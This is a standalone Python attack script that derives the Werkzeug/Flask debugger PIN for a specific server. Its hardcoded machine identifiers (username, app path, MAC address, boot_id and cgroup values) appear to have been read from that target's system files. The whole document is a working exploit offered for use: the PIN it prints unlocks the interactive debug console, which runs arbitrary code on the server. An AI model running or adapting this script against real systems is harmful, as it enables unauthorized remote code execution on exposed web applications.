#!/usr/bin/python3

# see https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

import hashlib
from itertools import chain
probably_public_bits = [
        'root', # username
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
        '2485377892357', # /sys/class/net/eth0/address >>>print(0xabc)
        b'06e7f214-d008-430b-8365-b9608cd98bd5c155d29658a3e343a41574af10c7b1fa2fc60872a33af03269f1fcde1e3e5851' # /proc/sys/kernel/random/boot_id + /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv =None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print(rv)
